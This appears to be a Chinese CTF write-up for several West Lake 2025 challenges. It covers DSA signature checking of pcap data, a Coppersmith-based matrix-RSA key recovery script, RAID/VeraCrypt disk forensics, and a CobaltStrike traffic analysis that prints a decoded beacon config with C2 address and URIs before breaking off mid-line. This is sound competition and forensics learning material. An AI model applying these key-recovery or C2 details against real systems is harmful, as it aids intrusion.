<p>压缩包存在密码，且不是伪加密，还有个图片，然后没头绪了</p>
<h2 id="DS-DSASignatureData-Luminoria"><a href="#DS-DSASignatureData-Luminoria" class="headerlink" title="[DS] DSASignatureData | @Luminoria"></a>[DS] DSASignatureData | @Luminoria</h2><blockquote>
<p>请你对附件中的流量文件进行分析，在该流量里有一些个人信息数据。附件中还有一份个人信息的签名数据 data-sign.csv（其中签名算法采用 DSA，哈希算法采用 SHA256）和一组公钥文件（位于 public 文件夹中，文件名格式为 public-XXXX.pem，其中 XXXX 为 userid 左侧补零至四位数，即个人用户对应的公钥文件）。由于数据可能在传输过程中被篡改过，因此需要你进行签名验证，验证数据是否被篡改。找出被篡改过的个人信息数据并保存到新的 csv 文件中（文件编码 utf-8，文件格式和 data.csv 保持一致），并将该文件上传至该题的校验平台（在该校验平台里可以下载该题的示例文件 example.csv，可作为该题的格式参考），校验达标即可拿到 flag。</p>
</blockquote>
<p>这道题目的重点是如何从流量包中筛选并提取出需要的数据，所有的数据都是以十六进制数据流的方式呈现的</p>
<p>而且还得注意保留用户请求路径，因为包含了userid的参数</p>
<p>所有总体的思路变成了这样</p>
<div class="mermaid-wrap"><pre class="mermaid-src" hidden>
  
graph LR
    A[使用tshark提取数据] --&gt; B[简单的数据格式处理]
    B --&gt; C[数据提取]
    C --&gt; D[数据去重]
    D --&gt; E[计算签名]
    E --&gt; F[验证签名]
    F --&gt; G[将签名不通过的用户信息保存到新的csv文件]

  </pre></div>

<p>接着就写了这样的脚本来一把梭</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> DSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Signature <span class="keyword">import</span> DSS</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_signature</span>(<span class="params">public_key, data, signature_b64</span>):</span><br><span class="line">    <span class="comment"># 将 Base64 编码的签名转换为字节</span></span><br><span class="line">    signature = base64.b64decode(signature_b64)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 哈希计算</span></span><br><span class="line">    h = SHA256.new(data.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建 DSA 验证对象</span></span><br><span class="line">    verifier = DSS.new(public_key, <span class="string">&#x27;fips-186-3&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 验证签名</span></span><br><span class="line">        verifier.verify(h, signature)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="comment"># 如果签名验证失败，则返回 False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_public_key</span>(<span class="params">userid</span>):</span><br><span class="line">    public_key_filename = <span class="string">f&quot;public/public-<span class="subst">&#123;userid:04d&#125;</span>.pem&quot;</span>  <span class="comment"># 补齐前导 0</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(public_key_filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        public_key = DSA.import_key(f.read())</span><br><span class="line">    <span class="keyword">return</span> public_key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_hex_data</span>(<span class="params">hex_data</span>):</span><br><span class="line">    decoded_data = unhexlify(hex_data.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>))  <span class="comment"># 将 hex 转换为字节</span></span><br><span class="line">    json_data = decoded_data.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> json.loads(json_data)  <span class="comment"># 转换为字典格式</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_signatures</span>(<span class="params">sign_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(sign_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        reader = csv.DictReader(f)</span><br><span class="line">        <span class="keyword">return</span> &#123;row[<span class="string">&#x27;username&#x27;</span>]: row <span class="keyword">for</span> row <span class="keyword">in</span> reader&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_sign_csv</span>(<span class="params">results, output_file</span>):</span><br><span class="line">    <span class="comment"># 排序</span></span><br><span class="line">    sorted_results = <span class="built_in">sorted</span>(results, key=<span class="keyword">lambda</span> x: x[<span class="string">&#x27;username&#x27;</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 写入 CSV 文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>, newline=<span class="string">&#x27;&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        fieldnames = [<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;name_signature&#x27;</span>, <span class="string">&#x27;idcard_signature&#x27;</span>, <span class="string">&#x27;phone_signature&#x27;</span>]</span><br><span class="line">        writer = csv.DictWriter(f, fieldnames=fieldnames)</span><br><span class="line">        writer.writeheader()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> sorted_results:</span><br><span class="line">            writer.writerow(row)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tshark 提取</span></span><br><span class="line">os.popen(<span class="string">&quot;tshark -r data.pcapng -Y &#x27;http.request.uri matches \&quot;/?userid=[0-9]&#123;1,4&#125;\&quot;&#x27; -T fields -e http.request.method -e http.file_data &gt;&gt; data.txt&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除成功的数据返回行</span></span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;data.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    lines = f.readlines()</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;7b226d657373616765223a225c75363061385c75353364315c75393030315c75373638345c75363537305c75363336655c75356466325c75363361355c75363533365c7566663031227d&quot;</span> <span class="keyword">in</span> line:	<span class="comment"># 成功提示，要去掉</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result.append(line.replace(<span class="string">&quot;\t&quot;</span>, <span class="string">&quot; &quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 去除重复数据</span></span><br><span class="line">unique_results = &#123;&#125;</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;result.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> result:</span><br><span class="line">        line_data = line.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">        userid = <span class="built_in">int</span>(line_data[<span class="number">0</span>].replace(<span class="string">&quot;/?userid=&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> userid <span class="keyword">not</span> <span class="keyword">in</span> unique_results:</span><br><span class="line">            unique_results[userid] = line.strip()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 将去重后的结果写入文件</span></span><br><span class="line">    f.write(<span class="string">&quot;\n&quot;</span>.join(unique_results.values()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行数据签名并验证</span></span><br><span class="line">signatures = read_signatures(<span class="string">&quot;data-sign.csv&quot;</span>)</span><br><span class="line">results = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> tqdm(unique_results.values()):</span><br><span class="line">    line_data = line.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    userid = <span class="built_in">int</span>(line_data[<span class="number">0</span>].replace(<span class="string">&quot;/?userid=&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    userdata = line_data[<span class="number">1</span>].replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    user_dict = parse_hex_data(userdata)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 获取对应的公钥</span></span><br><span class="line">    public_key = load_public_key(userid)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 验证各个字段的签名</span></span><br><span class="line">    name_valid = verify_signature(public_key, user_dict[<span class="string">&#x27;name&#x27;</span>], signatures[<span class="built_in">str</span>(userid)][<span class="string">&#x27;name_signature&#x27;</span>])</span><br><span class="line">    idcard_valid = verify_signature(public_key, user_dict[<span class="string">&#x27;idcard&#x27;</span>], signatures[<span class="built_in">str</span>(userid)][<span class="string">&#x27;idcard_signature&#x27;</span>])</span><br><span class="line">    phone_valid = verify_signature(public_key, user_dict[<span class="string">&#x27;phone&#x27;</span>], signatures[<span class="built_in">str</span>(userid)][<span class="string">&#x27;phone_signature&#x27;</span>])</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (name_valid <span class="keyword">and</span> idcard_valid <span class="keyword">and</span> phone_valid):</span><br><span class="line">        results.append(&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: userid,</span><br><span class="line">            <span class="string">&#x27;name_signature&#x27;</span>: user_dict[<span class="string">&#x27;name&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;idcard_signature&#x27;</span>: user_dict[<span class="string">&#x27;idcard&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;phone_signature&#x27;</span>: user_dict[<span class="string">&#x27;phone&#x27;</span>],</span><br><span class="line">        &#125;)</span><br><span class="line">        </span><br><span class="line"><span class="comment"># 生成csv</span></span><br><span class="line">generate_sign_csv(results, <span class="string">&#x27;sign.csv&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将保存的sign.csv上传到验证服务器就得到flag了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/CTF-West-Lake-2025-Preliminary-round-Writeup/msedge_Gzr4lbFmW4-1737195799564-5.png"></p>
<h2 id="Crypto-matrixRSA-KeqingMoe"><a href="#Crypto-matrixRSA-KeqingMoe" class="headerlink" title="[Crypto] matrixRSA | @KeqingMoe"></a>[Crypto] matrixRSA | <a href="https://keqing.moe/">@KeqingMoe</a></h2><p>要高位爆破搞pq，M是矩阵，普通rsa是标量，并且找到了对应的论文</p>
<blockquote>
<p><a href="https://www.gcsu.edu/sites/files/page-assets/node-808/attachments/pangia.pdf">https://www.gcsu.edu/sites/files/page-assets/node-808/attachments/pangia.pdf</a> - A Matrix Extension of the RSA Cryptosystem</p>
</blockquote>
<p>phi 换成这个，把标量看成1*1矩阵的话，代进去论文这个式子就会发现就是普通的φ(n)，这篇论文是对RSA的一个推广</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/CTF-West-Lake-2025-Preliminary-round-Writeup/bd32ce0e-28b3-4162-a91d-b73286e21946-1737195799564-1.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">132298777672085547096511087266255066285502135020124093900452138262993155381766816424955849796168059204379325075568094431259877923353664926875986223020472585645919414821322880213299188157427622804140996898685564075484754918339670099806186873974594139182324884620018780943630196754736972805036038798946726414009</span></span><br><span class="line">p4 = <span class="number">9707529668721508094878754383636813058761407528950189013789315732447048631740849315894253576415843631107370002912949379757275</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">pbits = <span class="number">512</span></span><br><span class="line">kbits = pbits - p4.nbits()</span><br><span class="line">p4 = p4 &lt;&lt; kbits</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p4</span><br><span class="line">roots = f.small_roots(X = <span class="number">2</span> ^ kbits, beta = <span class="number">0.4</span>)</span><br><span class="line">p = p4 + <span class="built_in">int</span>(roots[<span class="number">0</span>])</span><br><span class="line">q = n / p</span><br><span class="line"></span><br><span class="line">gp = (p ^ <span class="number">3</span> - p ^ <span class="number">2</span>) * (p ^ <span class="number">3</span> - p) * (p ^ <span class="number">3</span> - <span class="number">1</span>)</span><br><span class="line">gq = (q ^ <span class="number">3</span> - q ^ <span class="number">2</span>) * (q ^ <span class="number">3</span> - q) * (q ^ <span class="number">3</span> - <span class="number">1</span>)</span><br><span class="line">g = gp * gq</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = inverse_mod(e, g)</span><br><span class="line">data = [</span><br><span class="line">    [</span><br><span class="line">        <span class="number">130700952989014311434434028098810412089294728270156705618326733322297465714495704072159530618655340096705383710304658044991149662060657745933090473082775425812641300964472543605460360640675949447837208449794830578184968528547366608180085787382376536622136035364815331037493098283462540849880674541138443271941</span>,</span><br><span class="line">        <span class="number">71108771421281691064141020659106224750236412635914570166893031318860027728093402453305986361330527563506168063047627979831630830003190075818824767924892107148560048725155587353683119195901991465464478196049173060097561821877061015587704803006499153902855903286456023726638247758665778434728734461065079337757</span>,</span><br><span class="line">        <span class="number">67999998657112350704927993584783146575182096185020115836188544590466205688442741039622382576899587857972463337900200038021257164640987281308471100297698062626107380871262596623736773815445544153508352926374272336154553916204320257697068627063236060520725376727528604938949588845448940836430120015498687885615</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="number">23893343854815011808020457237095285782125931083991537368666368653089096539223297567339111502968295914745423286070638369517207554770793304994639155083818859208362057394004419565231389473766857235749279110546079776040193183912062870294579472815588333047561915280189529367474392709554971446978468118280633281993</span>,</span><br><span class="line">        <span class="number">9711323829269829751519177755915164402658693668631868499383945203627197171508441332211907278473276713066275283973856513580205808517918096017699122954464305556795300874005627001464297760413897074044080665941802588680926430030715299713241442313300920463145903399054123967914968894345491958980945927764454159601</span>,</span><br><span class="line">        <span class="number">44904507975955275578858125671789564568591470104141872573541481508697254621798834910263012676346204850278744732796211742615531019931085695420000582627144871996018850098958417750918177991375489106531511894991744745328626887250694950153424439172667977623425955725695498585224383607063387876414273539268016177401</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="number">67805732998935098446255672500407441801838056284635701147853683333480924477835278030145327818330916280792499177503535618310624546400536573924729837478349680007368781306805363621196573313903080315513952415535369016620873765493531188596985587834408434835281527678166509365418905214174034794683785063802543354572</span>,</span><br><span class="line">        <span class="number">13486048723056269216825615499052563411132892702727634833280269923882908676944418624902325737619945647093190397919828623788245644333036340084254490542292357044974139884304715033710988658109160936809398722070125690919829906642273377982021120160702344103998315875166038849942426382506293976662337161520494820727</span>,</span><br><span class="line">        <span class="number">95932690738697024519546289135992512776877884741458439242887603021792409575448192508456813215486904392440772808083658410285088451086298418303987628634150431725794904656250453314950126433260613949819432633322599879072805834951478466009343397728711205498602927752917834774516505262381463414617797291857077444676</span></span><br><span class="line">    ]</span><br><span class="line">]</span><br><span class="line">C = Matrix(Zmod(n), data)</span><br><span class="line">M = C ^ d</span><br><span class="line">m = []</span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> M:</span><br><span class="line">    <span class="keyword">for</span> val <span class="keyword">in</span> row:</span><br><span class="line">        m.append(long_to_bytes(<span class="built_in">int</span>(val)))</span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span>.join(m).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>用sage跑出来就得到flag了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/CTF-West-Lake-2025-Preliminary-round-Writeup/53BAC068D55A1E2FB9704D24543A1756-1737195799564-3.png"></p>
<h2 id="MISC-糟糕的磁盘-Luminoria-赛后出"><a href="#MISC-糟糕的磁盘-Luminoria-赛后出" class="headerlink" title="[MISC] 糟糕的磁盘 | @Luminoria | 赛后出"></a>[MISC] 糟糕的磁盘 | @Luminoria | 赛后出</h2><blockquote>
<p>Oops！你能找到磁盘中的秘密吗？</p>
</blockquote>
<h3 id="赛中"><a href="#赛中" class="headerlink" title="赛中"></a>赛中</h3><p>发现有RAID头，所以用R-Studio打开，发现在<code>uGZ85OzT.img</code>文件里面有一个图片</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/CTF-West-Lake-2025-Preliminary-round-Writeup/Xhh0TZf9sG-1737195799564-9.png"></p>
<p>图片是下面这张（没错它就是下面是空的）</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/CTF-West-Lake-2025-Preliminary-round-Writeup/img_1024x768x24_00-1737195799564-11.png" style="zoom:50%;" />

<p>一开始以为是类似于谷歌亲儿子的那个截图漏洞，用acropalypse，结果发现出不来，然后没头绪了，下一题！</p>
<h3 id="赛后"><a href="#赛后" class="headerlink" title="赛后"></a>赛后</h3><p>事实证明，R-Studio提取的文件是错的，换了UFS Explorer就能出来</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/CTF-West-Lake-2025-Preliminary-round-Writeup/ufs-explorer-pro_L8zPSf8yPa.png"></p>
<p>将五个文件拖进去，在左边能够看到重建后的磁盘，点开发现里面有一个图片和一个secret文件，都提取出来</p>
<p>发现secret文件是经典10MB，大概率是Vera的磁盘文件了，但是Vera的磁盘是有加密的，图片的名字又是key，所以图片应该是这个磁盘的密钥</p>
<p>加载后挂载，能看到里面有flag文件，然后就得到flag了 <code>DASCTF&#123;R41D_4ND_D15K_M4573R&#125;</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/CTF-West-Lake-2025-Preliminary-round-Writeup/Notepad_otYtXTWJpv.png"></p>
<h2 id="MISC-CSCS-Luminoria-未出"><a href="#MISC-CSCS-Luminoria-未出" class="headerlink" title="[MISC] CSCS | @Luminoria | 未出"></a>[MISC] CSCS | @Luminoria | 未出</h2><blockquote>
<p>CS? CS! Playing CS with me XD</p>
</blockquote>
<div class="note info flat"><p>第一次搞CobaltStrike流量分析，尽力了😭</p>
</div>

<h3 id="赛中-1"><a href="#赛中-1" class="headerlink" title="赛中"></a>赛中</h3><p>参考文献：<a href="https://www.freebuf.com/articles/network/407982.html">https://www.freebuf.com/articles/network/407982.html</a></p>
<p>一开始以为真的是分析Counter-Strike的流量包，但是后来发现应该是CobaltStrike</p>
<p>看HTTP协议，可以看到第一个心跳包（ID 147）</p>
<p>分析握手包用这个 <a href="https://github.com/minhangxiaohui/CSthing/blob/master/1768_v0_0_8/1768.py">https://github.com/minhangxiaohui/CSthing/blob/master/1768_v0_0_8/1768.py</a></p>
<p>保存后分析CS的信息如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">xorkey(chain): <span class="number">0x6dc452ff</span></span><br><span class="line">length: <span class="number">0x040400c9</span></span><br><span class="line">xorkey <span class="string">b&#x27;.&#x27;</span> 2e</span><br><span class="line"><span class="number">0x0001</span> payload <span class="built_in">type</span>                     <span class="number">0x0001</span> <span class="number">0x0002</span> <span class="number">0</span> windows-beacon_http-reverse_http</span><br><span class="line"><span class="number">0x0002</span> port                             <span class="number">0x0001</span> <span class="number">0x0002</span> <span class="number">12345</span></span><br><span class="line"><span class="number">0x0003</span> sleeptime                        <span class="number">0x0002</span> <span class="number">0x0004</span> <span class="number">60000</span></span><br><span class="line"><span class="number">0x0004</span> maxgetsize                       <span class="number">0x0002</span> <span class="number">0x0004</span> <span class="number">1048576</span></span><br><span class="line"><span class="number">0x0005</span> jitter                           <span class="number">0x0001</span> <span class="number">0x0002</span> <span class="number">0</span></span><br><span class="line"><span class="number">0x0007</span> publickey                        <span class="number">0x0003</span> <span class="number">0x0100</span> 30819e300d06092a864886f70d010101050003818c00308188028180525e1781f2f02d132a7818a6d269baddbf39352c8d20290ec2294fbe4d77e6549ef4766d8b0e1620000adfbd7aff99cd72f05623eb0def202265cf631dd895acd5e981da8424c03a295895c8194a31641f2eecd5a8715ca89cdbf9433c5d437538767666c3bdb0f8629555375b574fe408a94ae82f92960085d416374f1654b302030100010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line"><span class="number">0x0008</span> server,get-uri                   <span class="number">0x0003</span> <span class="number">0x0100</span> <span class="string">&#x27;10.11.4.3,/cm&#x27;</span></span><br><span class="line"><span class="number">0x0043</span> DNS_STRATEGY                     <span class="number">0x0001</span> <span class="number">0x0002</span> <span class="number">0</span></span><br><span class="line"><span class="number">0x0044</span> DNS_STRATEGY_ROTATE_SECONDS      <span class="number">0x0002</span> <span class="number">0x0004</span> -<span class="number">1</span></span><br><span class="line"><span class="number">0x0045</span> DNS_STRATEGY_FAIL_X              <span class="number">0x0002</span> <span class="number">0x0004</span> -<span class="number">1</span></span><br><span class="line"><span class="number">0x0046</span> DNS_STRATEGY_FAIL_SECONDS        <span class="number">0x0002</span> <span class="number">0x0004</span> -<span class="number">1</span></span><br><span class="line"><span class="number">0x000e</span> SpawnTo                          <span class="number">0x0003</span> <span class="number">0x0010</span> <span class="string">&#x27;ªï³±Ký¦\x03\x1e@\x89ã\x93\t&lt;X&#x27;</span></span><br><span class="line"><span class="number">0x001d</span> spawnto_x86                      <span class="number">0x0003</span> <span class="number">0x0040</span> <span class="string">&#x27;%windir%\\syswow64\\rundll32.exe&#x27;</span></span><br><span class="line"><span class="number">0x001e</span> spawnto_x64                      <span class="number">0x0003</span> <span class="number">0x0040</span> <span class="string">&#x27;%windir%\\sysnative\\rundll32.exe&#x27;</span></span><br><span class="line"><span class="number">0x001f</span> CryptoScheme                     <span class="number">0x0001</span> <span class="number">0x0002</span> <span class="number">0</span></span><br><span class="line"><span class="number">0x001a</span> get-verb                         <span class="number">0x0003</span> <span class="number">0x0010</span> <span class="string">&#x27;GET&#x27;</span></span><br><span class="line"><span class="number">0x001b</span> post-verb                        <span class="number">0x0003</span> <span class="number">0x0010</span> <span class="string">&#x27;POST&#x27;</span></span><br><span class="line"><span class="number">0x001c</span> HttpPostChunk                    <span class="number">0x0002</span> <span class="number">0x0004</span> <span class="number">0</span></span><br><span class="line"><span class="number">0x0025</span> license-<span class="built_in">id</span>                       <span class="number">0x0002</span> <span class="number">0x0004</span> <span class="number">1234567890</span> Stats uniques -&gt; ips/hostnames: <span class="number">298</span> publickeys: <span class="number">236</span></span><br><span class="line"><span class="number">0x0026</span> bStageCleanup                    <span class="number">0x0001</span> <span class="number">0x0002</span> <span class="number">0</span></span><br><span class="line"><span class="number">0x0027</span> bCFGCaution                      <span class="number">0x0001</span> <span class="number">0x0002</span> <span class="number">0</span></span><br><span class="line"><span class="number">0x0009</span> useragent                        <span class="number">0x0003</span> <span class="number">0x0100</span> <span class="string">&#x27;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; MALCJS)&#x27;</span></span><br><span class="line"><span class="number">0x000a</span> post-uri                         <span class="number">0x0003</span> <span class="number">0x0040</span> <span class="string">&#x27;/submit.php&#x27;</span></span><br><span class="line"><span class="number">0x000b</span> Malleable_C2_Instructions        <span class="number">0x0003</span> <span class="number">0x0100</span></span><br><span class="line">  Transform Input: [<span class="number">7</span>:Input,<span class="number">4</span>]</span><br><span class="line">   Print</span><br><span class="line"><span class="number">0x000c</span> http_get_header                  <span class="number">0x0003</span> <span class="number">0x0200</span></span><br><span 